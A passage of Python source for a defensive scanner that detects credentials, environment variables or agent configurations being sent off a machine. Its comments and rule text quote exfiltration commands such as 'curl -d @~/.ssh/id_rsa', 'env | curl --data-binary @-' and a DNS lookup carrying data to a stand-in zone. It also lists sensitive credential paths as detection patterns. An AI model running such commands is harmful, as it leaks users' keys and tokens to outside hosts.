    def near(open_at: int) -> bool:
        k = bisect_right(marks, open_at)
        return k < len(marks) and marks[k] < open_at + _ARGS_LIMIT

    def carries_env(start: int, end: int, url_end: int | None = None) -> bool:
        def sent(pos: int) -> bool:
            # In the address argument, the environment handed to the code's own URL builder
            # configures the request; it is not what the request carries.
            return url_end is None or pos >= url_end or not _config_lookup(text, start, pos)

        k = bisect_right(whole, start - 1)
        while k < len(whole) and whole[k] < end:
            if sent(whole[k]):
                return True
            k += 1
        if names is None:
            return False
        return any(
            _code_offset(f, m.start()) and not _JS_MEMBER_READ.match(text, m.end())
            and any(a <= m.start() < b for a, b in scopes[m.group(0)])
            and sent(m.start())
            for m in names.finditer(text, start, end)
        )

    found: list[Evidence] = []
    for pattern, needs_channel, needs_net_cmd in (
        (_JS_SINK, False, False), (_JS_SEND, True, False), (_JS_EXEC, False, True),
    ):
        if needs_channel and not opens_channel:
            continue
        calls = 0
        for m in pattern.finditer(text):
            open_at = m.end() - 1
            if not near(open_at):
                continue
            calls += 1
            if calls > _MAX_CALLS:
                truncated = True
                break
            if not _code_offset(f, m.start()):
                continue
            if pattern is _JS_SEND and _JS_LOCAL_STREAM.search(
                text, max(0, m.start() - 40), m.start()
            ):
                continue
            close = _call_args(text, open_at)
            if close is None:
                continue
            args = text[open_at + 1 : close]
            if _LOCAL_URL.match(args):
                continue
            if needs_net_cmd and not _SHELL_NET.search(args):
                continue
            # A process call's last argument, when it is an object, is its options: `env` there is
            # the environment the child runs in (pm2: `spawn('wget', [url], {env: process.env})`),
            # not data it sends. The command and its arguments are what can carry it out.
            end = _options_start(text, open_at + 1, close) if needs_net_cmd else close
            url_end = _first_arg_end(text, open_at + 1, close) if pattern is _JS_SINK else None
            if carries_env(open_at + 1, end, url_end):
                found.append(f.evidence_for_span(m.start(), close + 1))
                if len(found) >= MAX_EVIDENCE_SCANNED:
                    return found, False
    return found, truncated


# Python: modules whose calls reach the network, and the calls/methods that send data.
_PY_NET_MODULES = frozenset(
    {"requests", "httpx", "aiohttp", "urllib3", "urllib", "http", "socket", "smtplib",
     "websocket", "websockets", "ftplib", "pycurl", "grequests", "treq"}
)
_PY_SEND_LEAVES = frozenset(
    {"get", "post", "put", "patch", "delete", "head", "options", "request", "urlopen",
     "Request", "stream", "send", "sendall", "sendto", "sendmail", "send_message"}
)
# Methods on an object the code made (a session, a connection, a socket): `.get` is left out,
# since on anything but a network module it is a dictionary read.
_PY_METHOD_SENDS = frozenset(
    {"post", "put", "patch", "request", "send", "sendall", "sendto", "sendmail", "send_message",
     "urlopen"}
)
# Uses of `os.environ` that read one variable, test for one, or change the environment.
_PY_ENV_MEMBER = frozenset(
    {"get", "setdefault", "pop", "keys", "__getitem__", "__contains__", "__setitem__", "update",
     "clear", "popitem"}
)
_PY_SCOPES = (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)
# Built-ins that answer yes or no about what they are given (unless the file defines the name).
_PY_TRUTH_BUILTINS = frozenset({"any", "all"})
# Bound for a crafted file: how many times "does this function return the environment" is worked
# out (a real module asks once per function and parameter).
_MAX_RETURN_QUESTIONS = 2000


class _PyImports:
    def __init__(self, tree: ast.AST) -> None:
        self.modules: dict[str, str] = {}  # local name -> module path
        self.names: dict[str, str] = {}  # local name -> module.attr
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    local = alias.asname or alias.name.split(".")[0]
                    self.modules[local] = alias.name if alias.asname else local
            elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
                for alias in node.names:
                    self.names[alias.asname or alias.name] = f"{node.module}.{alias.name}"

    def dotted(self, node: ast.expr) -> str | None:
        if isinstance(node, ast.Name):
            if node.id in self.names:
                return self.names[node.id]
            return self.modules.get(node.id, node.id)
        if isinstance(node, ast.Attribute):
            base = self.dotted(node.value)
            return f"{base}.{node.attr}" if base else None
        return None

    def network(self) -> bool:
        heads = {m.split(".")[0] for m in self.modules.values()}
        heads |= {n.split(".")[0] for n in self.names.values()}
        return bool(heads & _PY_NET_MODULES)


def _py_is_environ(node: ast.expr, imports: _PyImports) -> bool:
    return imports.dotted(node) == "os.environ"


def _py_env_dumps(f: IndexedFile) -> list[Evidence]:
    if "environ" not in f.text:
        return []
    try:
        tree = ast.parse(f.text)
    except (SyntaxError, ValueError, RecursionError, MemoryError):
        return []
    imports = _PyImports(tree)
    if not imports.network():
        return []
    parents: dict[int, ast.AST] = {}
    for parent in ast.walk(tree):
        for child in ast.iter_child_nodes(parent):
            parents[id(child)] = parent

    def whole_environ(node: ast.AST) -> bool:
        if not isinstance(node, (ast.Name, ast.Attribute)) or not _py_is_environ(node, imports):
            return False
        parent = parents.get(id(node))
        if isinstance(parent, ast.Subscript) and parent.value is node:
            return False  # os.environ["X"]
        if isinstance(parent, ast.Attribute) and parent.attr in _PY_ENV_MEMBER:
            return False  # os.environ.get("X")
        if isinstance(parent, ast.Compare) and node in parent.comparators:
            return False  # "X" in os.environ
        return True

    env_nodes = {id(n) for n in ast.walk(tree) if whole_environ(n)}
    if not env_nodes:
        return []

    # A name holds the environment in the function it was given it in (and the functions nested
    # in that one): a module reuses short names (`env`, `key`, `body`) in many unrelated functions,
    # and following a name across the whole file joined them all up.
    def scope_of(node: ast.AST) -> ast.AST:
        parent = parents.get(id(node))
        while parent is not None and not isinstance(parent, _PY_SCOPES):
            parent = parents.get(id(parent))
        return parent if parent is not None else tree

    chains: dict[int, list[ast.AST]] = {}

    def chain(scope: ast.AST) -> list[ast.AST]:
        if id(scope) not in chains:
            chains[id(scope)] = [scope] + ([] if scope is tree else chain(scope_of(scope)))
        return chains[id(scope)]

    def one_variable(node: ast.Name) -> bool:
        parent = parents.get(id(node))
        if isinstance(parent, ast.Subscript) and parent.value is node:
            return True  # env["X"] on a name assigned the environment
        return isinstance(parent, ast.Attribute) and parent.attr in _PY_ENV_MEMBER

    # The file's own functions, by name: what one returns is known, so the environment handed to
    # one (`token = resolve_token(os.environ)`) is followed only into a result that carries it.
    defs: dict[str, list[ast.AST]] = {}
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            defs.setdefault(node.name, []).append(node)

    def own_function(call: ast.Call) -> list[ast.AST]:
        func = call.func
        if isinstance(func, ast.Name) and func.id not in imports.names:
            return defs.get(func.id, [])
        if (isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name)
                and func.value.id in ("self", "cls")):
            return defs.get(func.attr, [])
        return []

    Tainted = set[tuple[ast.AST, str]]

    def carries(expr: ast.AST, scope: ast.AST, tainted: Tainted) -> bool:
        stack = [expr]
        while stack:
            node = stack.pop()
            if id(node) in env_nodes:
                return True
            if (isinstance(node, ast.Name) and not one_variable(node)
                    and any((s, node.id) in tainted for s in chain(scope))):
                return True
            if isinstance(node, ast.Compare):
                continue  # `"X" in env`, `env == {}`: a yes or no
            if isinstance(node, ast.Call):
                functions = own_function(node)
                if functions:
                    if any(call_carries(node, fn, scope, tainted) for fn in functions):
                        return True
                    continue  # its arguments went in; what came back is its own result
                if (isinstance(node.func, ast.Name) and node.func.id in _PY_TRUTH_BUILTINS
                        and node.func.id not in imports.names):
                    continue  # `any(k.startswith("X_") for k in env)`: a yes or no
            for child in ast.iter_child_nodes(node):
                # A child process's `env=` is the environment it runs in, not data it carries:
                # what it returns (its output, a queue line read from it) holds no secret.
                if isinstance(child, ast.keyword) and child.arg == "env":
                    continue
                stack.append(child)
        return False

    def call_carries(call: ast.Call, fn: ast.AST, scope: ast.AST, tainted: Tainted) -> bool:
        """True if the result of ``call`` to the file's own ``fn`` carries the environment."""
        if returns(fn, None):
            return True  # it returns the environment it reads itself
        params = [a.arg for a in (*fn.args.posonlyargs, *fn.args.args)]
        if isinstance(call.func, ast.Attribute) and params[:1] in (["self"], ["cls"]):
            params = params[1:]
        named = {*params, *(a.arg for a in fn.args.kwonlyargs)}
        rest_pos = fn.args.vararg.arg if fn.args.vararg else None
        rest_kw = fn.args.kwarg.arg if fn.args.kwarg else None
        given: list[tuple[str | None, ast.expr]] = []
        for i, arg in enumerate(call.args):
            if isinstance(arg, ast.Starred):
                given.append((None, arg))
            else:
                given.append((params[i] if i < len(params) else rest_pos, arg))
        for kw in call.keywords:
            if kw.arg == "env":
                continue
            given.append((kw.arg if kw.arg in named else rest_kw if kw.arg else None, kw.value))
        # A parameter that cannot be named (`*args` unpacked into it) is taken to come back out.
        return any(
            carries(arg, scope, tainted) and (param is None or returns(fn, param))
            for param, arg in given
        )

    returned: dict[tuple[int, str | None], bool] = {}
    working: list[tuple[int, str | None]] = []  # the questions being answered, outermost first
    unsettled: set[tuple[int, str | None]] = set()
    asked = 0

    def returns(fn: ast.AST, param: str | None) -> bool:
        """True if ``fn`` returns (or yields) its parameter ``param``, or with None, the
        environment it reads itself.

        A function that calls itself adds nothing to what it returns: a helper that walks a value
        (``return {k: clean(v) for k, v in value.items()}``) returns the environment only if one of
        its other returns does. So a call met while its own answer is being worked out counts as
        "no", and a "no" reached on the way through such a call is not kept (the outer answer may
        still turn out "yes"); it is worked out again when asked for."""
        nonlocal asked
        key = (id(fn), param)
        if key in returned:
            return returned[key]
        if key in working:
            unsettled.update(working[working.index(key) + 1:])
            return False
        asked += 1
        if asked > _MAX_RETURN_QUESTIONS:
            return True  # a file built to make this expensive: assume it does
        working.append(key)
        inner: Tainted = {(fn, param)} if param else set()
        spread(inner, [a for a in assignments if fn in chain(scope_of(a))])
        result = any(
            isinstance(n, (ast.Return, ast.Yield, ast.YieldFrom)) and n.value is not None
            and scope_of(n) is fn and carries(n.value, fn, inner)
            for n in ast.walk(fn)
        )
        working.pop()
        if result or key not in unsettled:
            returned[key] = result
        unsettled.discard(key)
        return result

    def spread(tainted: Tainted, among: list[ast.AST]) -> None:
        for _ in range(4):
            grown = False
            for node in among:
                value = node.value
                scope = scope_of(node)
                if value is None or not carries(value, scope, tainted):
                    continue
                targets = node.targets if isinstance(node, ast.Assign) else [node.target]
                for target in targets:
                    # `payload["env"] = os.environ` fills the payload; `self.process = Popen(...)`
                    # does not make `self` the environment. Following attributes to their base
                    # marked `self` in a large server and, through it, hundreds of unrelated names.
                    if isinstance(target, ast.Attribute):
                        continue
                    while isinstance(target, ast.Subscript):
                        target = target.value
                    if isinstance(target, ast.Name) and (scope, target.id) not in tainted:
                        tainted.add((scope, target.id))
                        grown = True
            if not grown:
                break

    assignments = [
        n for n in ast.walk(tree) if isinstance(n, (ast.Assign, ast.AnnAssign, ast.AugAssign))
    ]
    tainted: Tainted = set()
    spread(tainted, assignments)

    found: list[Evidence] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call) or not isinstance(node.func, (ast.Name, ast.Attribute)):
            continue
        name = imports.dotted(node.func) or ""
        head, _, leaf = name.partition(".")
        leaf = name.rsplit(".", 1)[-1]
        module_send = head in _PY_NET_MODULES and leaf in _PY_SEND_LEAVES
        method_send = (
            isinstance(node.func, ast.Attribute) and node.func.attr in _PY_METHOD_SENDS
            and head not in imports.modules and head not in imports.names
        )
        if not (module_send or method_send):
            continue
        args = [*node.args, *(k.value for k in node.keywords)]
        if any(carries(a, scope_of(node), tainted) for a in args):
            end = getattr(node, "end_lineno", None) or node.lineno
            found.append(f.evidence_for_lines(node.lineno, end))
            if len(found) >= MAX_EVIDENCE_SCANNED:
                break
    return found


# --- Python: an agent client's stored configuration or conversations, sent --------------------
# `~/.cursor/mcp.json`, `claude_desktop_config.json` and `~/.claude.json` hold the launch command
# and the tokens of every MCP server the user configured. Installers read and rewrite them all the
# time, so naming or reading one says nothing; the file's contents passed into a network request
# is the credential leaving. Conversation transcripts (`~/.claude/projects/*/*.jsonl`,
# `~/.codex/sessions`) are read by usage meters and uploaded by session-sharing tools the user
# asked for, so the same flow from them is a review note, not a finding.
_AGENT_CLIENT_CONFIG = re.compile(
    r"\.cursor/mcp\.json|claude_desktop_config\.json|(?<![\w-])\.claude\.json\b|"
    r"\.codeium/windsurf/mcp_config\.json",
    re.IGNORECASE,
)
_AGENT_TRANSCRIPTS = re.compile(
    r"\.claude/projects\b|\.codex/sessions\b|\.claude/history\.jsonl|\.gemini/tmp\b",
    re.IGNORECASE,
)
# Calls that take a path and return a fact about the file, not what is in it.
_PY_NOT_CONTENT = frozenset(
    {"exists", "isfile", "is_file", "isdir", "is_dir", "getsize", "getmtime", "stat", "lstat",
     "access", "basename", "dirname", "len", "bool", "hexdigest", "unlink", "remove"}
)
_MAX_TAINT_ROUNDS = 6
AGENT_TRANSCRIPT_SEND = "Agent conversation transcripts are read and sent over the network"


def _py_agent_store_sends(f: IndexedFile, store: re.Pattern[str]) -> list[Evidence]:
    """Network sends in ``f`` that carry what was read from a path matching ``store``.

    A name holds the contents in the function it was assigned in (module-level names everywhere);
    it gets them from an assignment, a ``for`` over them, or a ``with ... as``."""
    if store.search(f.text) is None:
        return []
    try:
        tree = ast.parse(f.text)
    except (SyntaxError, ValueError, RecursionError, MemoryError):
        return []
    imports = _PyImports(tree)
    if not imports.network():
        return []
    parents: dict[int, ast.AST] = {}
    for parent in ast.walk(tree):
        for child in ast.iter_child_nodes(parent):
            parents[id(child)] = parent

    def scope_of(node: ast.AST) -> ast.AST:
        parent = parents.get(id(node))
        while parent is not None and not isinstance(parent, _PY_SCOPES):
            parent = parents.get(id(parent))
        return parent if parent is not None else tree

    tainted: set[tuple[int, str]] = set()

    def carries(expr: ast.AST, scope: ast.AST) -> bool:
        stack = [expr]
        while stack:
            node = stack.pop()
            if isinstance(node, ast.Constant) and isinstance(node.value, str):
                if store.search(node.value):
                    return True
                continue
            if isinstance(node, ast.Name):
                if (id(scope), node.id) in tainted or (id(tree), node.id) in tainted:
                    return True
                continue
            if isinstance(node, ast.Call):
                func = node.func
                leaf = func.attr if isinstance(func, ast.Attribute) else getattr(func, "id", "")
                if leaf in _PY_NOT_CONTENT:
                    continue
            stack.extend(ast.iter_child_nodes(node))
        return False

    # (value, targets) of every statement that gives names a value.
    flows: list[tuple[ast.AST, list[ast.AST], ast.AST]] = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign):
            flows.append((node.value, list(node.targets), node))
        elif isinstance(node, (ast.AnnAssign, ast.AugAssign)) and node.value is not None:
            flows.append((node.value, [node.target], node))
        elif isinstance(node, (ast.For, ast.AsyncFor)):
            flows.append((node.iter, [node.target], node))
        elif isinstance(node, (ast.With, ast.AsyncWith)):
            for item in node.items:
                if item.optional_vars is not None:
                    flows.append((item.context_expr, [item.optional_vars], node))
    for _ in range(_MAX_TAINT_ROUNDS):
        grown = False
        for value, targets, node in flows:
            scope = scope_of(node)
            if not carries(value, scope):
                continue
            for target in targets:
                for name in ast.walk(target):
                    # `self.config = ...` does not make `self` the file (see the environment check).
                    if isinstance(name, ast.Name) and not isinstance(
                        parents.get(id(name)), ast.Attribute
                    ) and (id(scope), name.id) not in tainted:
                        tainted.add((id(scope), name.id))
                        grown = True
        if not grown:
            break

    found: list[Evidence] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call) or not isinstance(node.func, (ast.Name, ast.Attribute)):
            continue
        name = imports.dotted(node.func) or ""
        head = name.partition(".")[0]
        leaf = name.rsplit(".", 1)[-1]
        module_send = head in _PY_NET_MODULES and leaf in _PY_SEND_LEAVES
        method_send = (
            isinstance(node.func, ast.Attribute) and node.func.attr in _PY_METHOD_SENDS
            and head not in imports.modules and head not in imports.names
        )
        if not (module_send or method_send):
            continue
        scope = scope_of(node)
        if any(carries(a, scope) for a in (*node.args, *(k.value for k in node.keywords))):
            end = getattr(node, "end_lineno", None) or node.lineno
            found.append(f.evidence_for_lines(node.lineno, end))
            if len(found) >= MAX_EVIDENCE_SCANNED:
                break
    return found


class SecretExfilScanner(Scanner):
    name = "secret_exfil"
    rules = [
        RuleSpec(
            id=RULE_ID,
            category="exfiltration_path",
            severity=Severity.HIGH,
            title="Credentials or the whole environment sent off the machine",
            description=(
                "One command or call reads a credential and sends it over the network. A "
                "command an agent or editor runs on its own (a hook, an MCP server's launch "
                "command, a status line or credential helper, a plugin monitor), an npm "
                "install-time script, a shell script a skill or an instruction file gives the "
                "agent to run, a git hook file, a shell block of an instruction file, or a "
                "command string handed to a shell from Python or JavaScript uploads a key or "
                "credential file, a login token or the environment (`curl -d @~/.ssh/id_rsa`, "
                "`env | curl --data-binary @-`), sends a named provider token "
                "(`$GITHUB_TOKEN`, `$ANTHROPIC_API_KEY`) to a host that is not that provider, "
                "or collects credentials into a file, an archive or a variable and sends that "
                "on a later line; or code passes the whole process environment "
                "(`process.env`, `os.environ`) into an HTTP request, encodes a credential and "
                "looks it up as the labels of DNS names under a zone written into the code "
                "(`socket.gethostbyname(f\"{chunk}.t.example\")`), or Python code reads an "
                "agent client's MCP configuration (`~/.cursor/mcp.json`, "
                "`claude_desktop_config.json`, `~/.claude.json`: the tokens of every configured "
                "server) and passes its contents into a request. The environment holds the "
                "machine's tokens and keys, so either way they reach whoever runs the endpoint."
            ),
            recommendation=(
                "Do not install the component or open the project in an agent. Remove the "
                "command or call; if it already ran, rotate every credential the machine and its "
                "environment held."
            ),
            capability=Capability.NETWORK_EGRESS,
            threat_class=ThreatClass.MALICIOUS_INDICATOR,
        ),
    ]

    def scan(self, index: FileIndex) -> ScanResult:
        evidence: list[Evidence] = []
        by_path = {f.relpath: f for f in index.files}
        for command in autorun_commands(index).commands:
            if command.is_http:
                continue
            ev = _command_evidence(command)
            if ev is None:
                ev = _script_evidence(command, by_path)
            if ev is not None:
                evidence.append(ev)
        evidence.extend(_install_evidence(index, by_path))
        seen = {(ev.file, ev.line_start) for ev in evidence}
        evidence.extend(_shell_file_evidence(index, seen))
        evidence.extend(_instruction_evidence(index))
        evidence.extend(_code_command_evidence(index))
        partly: list[tuple[str, int | None]] = []
        for f in index.select(suffixes=_JS_SUFFIXES):
            sends, truncated = _js_env_sends(f)
            evidence.extend(sends)
            evidence.extend(dns_secret_lookups(f))
            if truncated and not sends:
                partly.append((f.relpath, None))
            if len(evidence) >= MAX_EVIDENCE_SCANNED:
                break
        transcripts: list[tuple[str, int | None]] = []
        for f in index.select(suffixes=(".py", ".pyw")):
            evidence.extend(_py_env_dumps(f))
            evidence.extend(dns_secret_lookups(f))
            evidence.extend(_py_agent_store_sends(f, _AGENT_CLIENT_CONFIG))
            transcripts.extend(
                (ev.file, ev.line_start) for ev in _py_agent_store_sends(f, _AGENT_TRANSCRIPTS)
            )
            if len(evidence) >= MAX_EVIDENCE_SCANNED:
                break
        # A file with more uses of the environment, or more calls beside them, than a real one
        # has was not searched to its end: say so rather than call it clean.
        needs_review = [aggregated_review(
            category="coverage",
            title=ENV_SEND_PARTLY_READ,
            places=partly,
            what="JavaScript file(s) hold more uses of process.env, or more calls beside them, "
                 "than the check for the environment being sent follows",
            advice="Part of each was not checked for sending the environment off the machine.",
        )] if partly else []
        if transcripts:
            needs_review.append(aggregated_review(
                category="exfiltration_path",
                title=AGENT_TRANSCRIPT_SEND,
                places=transcripts,
                what="network request(s) carry what was read from an agent's stored "
                     "conversations (~/.claude/projects, ~/.codex/sessions)",
                advice="Transcripts hold everything typed and pasted into the agent, secrets "
                       "included. A tool the user installed to share or sync sessions does "
                       "this; anything else has no reason to.",
            ))
        if not evidence:
            return ScanResult(needs_review=needs_review)
        return ScanResult(findings=[_finding_from_rule(self.rules[0], evidence)],
                          needs_review=needs_review)


def _command_evidence(command: AutorunCommand) -> Evidence | None:
    text = command.text
    env = " ".join(p.text for p in command.env)
    span = secret_upload(text, env)
    if span is None:
        return None
    return command.evidence(command.piece_at(span[0]))


_SCRIPT_TOKEN = re.compile(r"[\w.${}/\\-]{1,300}\.(?:sh|bash|zsh|ps1)\b")
_SHELL_SUFFIXES = (".sh", ".bash", ".zsh", ".ps1")


def _script_evidence(command: AutorunCommand, by_path: dict[str, IndexedFile]) -> Evidence | None:
    """A shell script the command runs, shipped in the component, that uploads a credential."""
    return _run_script_evidence(command.text, command.file.relpath, by_path)


def _run_script_evidence(
    command: str, command_file: str, by_path: dict[str, IndexedFile]
) -> Evidence | None:
    """A shell script ``command`` (written in ``command_file``) runs, shipped in the component,
    that uploads a credential: in one line, or collected into a file or variable first and that
    sent by a later line."""
    near = command_file.split("/")[:-1]
    folders = [""] + ["/".join(near[:k]) for k in range(len(near), 0, -1)]
    for token in _SCRIPT_TOKEN.findall(command):
        cleaned = re.sub(r"^(?:\$\{?\w+\}?[\"']?[/\\])+", "", token)
        cleaned = re.sub(r"^(?:\.[/\\])+", "", cleaned).replace("\\", "/").lstrip("/")
        for folder in folders:
            script = by_path.get(f"{folder}/{cleaned}" if folder else cleaned)
            if script is None or script.suffix not in _SHELL_SUFFIXES:
                continue
            ev = _shell_script_upload(script)
            if ev is not None:
                return ev
    return None


def _shell_script_upload(script: IndexedFile) -> Evidence | None:
    """The line of a shell script that uploads a credential, or the lines that collect one into a
    file or variable and send it later; None when the script does neither."""
    for line_no in range(1, len(script.text.splitlines()) + 1):
        line = script.line_text(line_no)
        if line.lstrip().startswith("#"):
            continue
        span = secret_upload(line)
        if span is not None:
            return script.evidence_for_lines(line_no, line_no)
    staged = staged_upload_lines(script.text.splitlines())
    if staged is not None:
        read_at, send_at = staged
        # Both lines when they are close together, else the send alone.
        first = read_at if send_at - read_at <= _STAGED_SPAN else send_at
        return script.evidence_for_lines(first, send_at)
    return None


# --- commands nothing runs on its own ---------------------------------------------------------
# A shell script the component ships (the one an instruction file or a person runs: `Run
# scripts/setup.sh once`), a git hook file, a shell block of an agent-instruction file, and the
# command string a Python or JavaScript file hands to a shell. Each statement is judged on its
# own, as ``secret_upload(..., strict=True)`` reads it, so a credential path and a network client
# count together only when one command holds both (`[ -d ~/.aws ] || curl -o awscli.zip ...` is
# two commands), and the collect-then-send follow runs over the statements in order.
_GIT_HOOK_NAMES = frozenset({
    "applypatch-msg", "pre-applypatch", "post-applypatch", "pre-commit", "pre-merge-commit",
    "prepare-commit-msg", "commit-msg", "post-commit", "pre-rebase", "post-checkout",
    "post-merge", "pre-push", "pre-receive", "post-receive", "post-update", "pre-auto-gc",
    "post-rewrite", "push-to-checkout", "reference-transaction",
})
_SHELL_FENCES = frozenset({"", "bash", "sh", "shell", "zsh", "console", "terminal", "!"})
_FENCE_INFO = re.compile(r" {0,3}(?:`{3,}|~{3,})[ \t]*([\w+!-]*)")
# Prose right above a block that shows a command as something to refuse or to look for: a
# security skill's example of an attack is not a step to run.
_SHOWN_AS_EXAMPLE = re.compile(
    r"\b(?:never|do\s+not|don'?t|must\s+not|should\s+not)\s+(?:run|execute|use|follow|obey|paste"
    r"|allow|approve)\b|\b(?:malicious|attack(?:er|s)?|suspicious|red\s+flags?|exfiltrat\w+"
    r"|look\s+for|refuse|block(?:ed|s)?)\b",
    re.IGNORECASE,
)
_PROSE_ABOVE = 400


def _shown_as_example(text: str, fence_start: int) -> bool:
    """True if the two lines of prose above a code block present it as an attack to recognise
    or a command to refuse."""
    above = text[max(0, fence_start - _PROSE_ABOVE):fence_start]
    lines = [x for x in above.split("\n") if x.strip()]
    return bool(_SHOWN_AS_EXAMPLE.search("\n".join(lines[-2:])))


def _statements(line: str) -> list[str]:
    """The separate commands of one shell line, split on ``;``, ``&&`` and ``||`` outside quotes
    and substitutions (a pipeline stays whole), with a trailing ``#`` comment dropped."""
    out: list[str] = []
    quote = ""
    depth = 0
    start = i = 0
    n = len(line)
    while i < n:
        ch = line[i]
        if quote == "'":
            if ch == "'":
                quote = ""
        elif ch == "\\":
            i += 2
            continue
        elif ch == "$" and line.startswith("$(", i):
            depth += 1
            i += 2
            continue
        elif ch == ")" and depth:
            depth -= 1
        elif quote:
            if ch == quote:
                quote = ""
        elif ch in "'\"":
            quote = ch
        elif depth == 0:
            if ch == "#" and (i == 0 or line[i - 1] in " \t"):
                break
            if ch == ";" or line.startswith(("&&", "||"), i):
                out.append(line[start:i])
                i += 1 if ch == ";" else 2
                start = i
                continue
        i += 1
    out.append(line[start:i])
    return [s for s in out if s.strip()]


def _command_lines(text: str, first_line: int = 1) -> list[tuple[int, int, str]]:
    """``(first line, last line, command)`` for each shell statement of ``text``, with
    backslash-newline continuations joined the way the shell joins them."""
    out: list[tuple[int, int, str]] = []
    parts: list[str] = []
    began = first_line
    for no, raw in enumerate(text.split("\n")[:_MAX_STAGED_LINES], start=first_line):
        raw = raw.rstrip("\r")
        if not parts:
            began = no
            if raw.lstrip().startswith("#"):
                continue
        if raw.endswith("\\") and not raw.endswith("\\\\"):
            parts.append(raw[:-1])
            continue
        parts.append(raw)
        out.extend((began, no, s) for s in _statements(" ".join(parts)))
        parts = []
    return out


def _commands_upload(
    f: IndexedFile, text: str, first_line: int = 1
) -> Evidence | None:
    """The first statement of the shell ``text`` (which starts at ``first_line`` of ``f``) that
    uploads a credential, or the statements that collect one and send it later."""
    commands = _command_lines(text, first_line)
    for began, ended, command in commands:
        if secret_upload(command, strict=True) is not None and not _only_prints(command):
            return f.evidence_for_lines(began, ended)
    staged = staged_upload_lines([c for _b, _e, c in commands], strict=True)
    if staged is not None:
        read_at, send_at = commands[staged[0] - 1][0], commands[staged[1] - 1][1]
        first = read_at if send_at - read_at <= _STAGED_SPAN else commands[staged[1] - 1][0]
        return f.evidence_for_lines(first, send_at)
    return None


_PRINTS = re.compile(r"\s*(?:echo|printf|Write-Host|Write-Output)\s")
_QUOTED = re.compile(r"\"(?:[^\"\\]|\\.)*\"|'[^']*'")


def _only_prints(command: str) -> bool:
    """True if the statement only prints text for a person to read (``echo "Then run: cat
    ~/.kube/config | curl ..."``): an output command whose text runs nothing and goes nowhere. A
    substitution inside it runs, and output piped or redirected onward is on its way somewhere."""
    if not _PRINTS.match(command) or "$(" in command or "`" in command:
        return False
    return not re.search(r"[|>]", _QUOTED.sub("", command))


def _is_shell_file(f: IndexedFile) -> bool:
    """A shell script by suffix or first line, or a suffix-less git hook file (git runs those
    with a shell when they have no first line naming another interpreter)."""
    if f.suffix in _SHELL_SUFFIXES:
        return True
    if f.suffix != "":
        return False
    if f.is_shell_like:
        return True
    name = f.relpath.rsplit("/", 1)[-1]
    return name in _GIT_HOOK_NAMES and not f.text.startswith("#!")


def _shell_file_evidence(index: FileIndex, seen: set[tuple[str, int]]) -> list[Evidence]:
    """Shell scripts an agent is given to run, and git hook files, whose own commands upload a
    credential. A script counts when it sits in a skill's folder (next to or below a SKILL.md),
    when an agent-instruction file names it (``Run `scripts/setup.sh` once``, "run the backup.sh
    script"), or when it has a git hook's name (git runs ``pre-push`` from whatever folder
    ``core.hooksPath`` points at). Any other script of a package is run by nothing the component
    ships and is left to the sensitive-path rule."""
    candidates = [
        f for f in index.files
        if _is_shell_file(f) and _may_send(f.text)
    ]
    if not candidates:
        return []
    skill_folders = {
        f.relpath.rpartition("/")[0] for f in index.files
        if f.relpath.rsplit("/", 1)[-1].lower() == "skill.md"
    }
    instructions = [f.text for f in index.files if _INSTRUCTION_FILE.search(f.relpath)]
    found: list[Evidence] = []
    for f in candidates:
        name = f.relpath.rsplit("/", 1)[-1]
        if not (
            (f.suffix == "" and name in _GIT_HOOK_NAMES)
            or any(d == "" or f.relpath.startswith(d + "/") for d in skill_folders)
            or _named_in(name, instructions)
        ):
            continue
        ev = _commands_upload(f, f.text)
        if ev is not None and (ev.file, ev.line_start) not in seen:
            seen.add((ev.file, ev.line_start))
            found.append(ev)
            if len(found) >= MAX_EVIDENCE_SCANNED:
                break
    return found


def _named_in(name: str, texts: list[str]) -> bool:
    """True if one of ``texts`` names the file ``name`` as a whole word."""
    if not texts:
        return False
    word = re.compile(rf"(?<![\w.-]){re.escape(name)}(?![\w-])")
    return any(name in text and word.search(text) for text in texts)


def _instruction_evidence(index: FileIndex) -> list[Evidence]:
    """Shell blocks of agent-instruction files (SKILL.md, a command or subagent file, CLAUDE.md,
    AGENTS.md) whose commands upload a credential. A block shown as an example of what to refuse
    is not a step."""
    found: list[Evidence] = []
    for f in index.files:
        if f.suffix not in (".md", ".mdx") or not (
            f.agent_read or _INSTRUCTION_FILE.search(f.relpath)
        ):
            continue
        if not _may_send(f.text):
            continue
        for start, end in f.markdown_code_spans():
            info = _FENCE_INFO.match(f.text, start)
            if info is None or info.group(1).lower() not in _SHELL_FENCES:
                continue
            if _shown_as_example(f.text, start):
                continue
            ev = _commands_upload(f, f.text[start:end], f.line_of_offset(start))
            if ev is not None:
                found.append(ev)
                if len(found) >= MAX_EVIDENCE_SCANNED:
                    return found
    return found


def _may_hold_upload_command(text: str) -> bool:
    """A whole file's quick test before it is parsed: somewhere it names a command-line network
    client with, a few lines around it, something a command could send (a credential location,
    the environment, a login token). A command string is written in one place."""
    for k, m in enumerate(_SHELL_NET.finditer(text)):
        if k >= _MAX_CLIENT_SITES:
            return True  # too many to look around each: read the file
        lo, hi = max(0, m.start() - _AROUND_CLIENT), m.end() + _AROUND_CLIENT
        if (
            _STRONG_PATHS.search(text, lo, hi) or _NETRC.search(text, lo, hi)
            or _ENV_DUMP.search(text, lo, hi) or _TOKEN_VARIABLE.search(text, lo, hi)
            or any(p.search(text, lo, hi) for p, _own in _TOKEN_COMMANDS)
        ):
            return True
    return False


_AROUND_CLIENT = 600
_MAX_CLIENT_SITES = 200


def _code_command_evidence(index: FileIndex) -> list[Evidence]:
    """Command strings a Python or JavaScript file hands to a shell (``os.system``,
    ``subprocess`` with ``shell=True`` or a ``sh -c`` list, ``child_process.exec``) that upload a
    credential."""
    found: list[Evidence] = []
    for f in index.select(suffixes=(".py", ".pyw")):
        if not _may_hold_upload_command(f.text):
            continue
        try:
            tree = ast.parse(f.text)
        except (SyntaxError, ValueError, RecursionError, MemoryError):
            continue
        imports = _PyImports(tree)
        for call in ast.walk(tree):
            if not isinstance(call, ast.Call):
                continue
            name = imports.dotted(call.func)
            if name not in SHELL_CALLS:
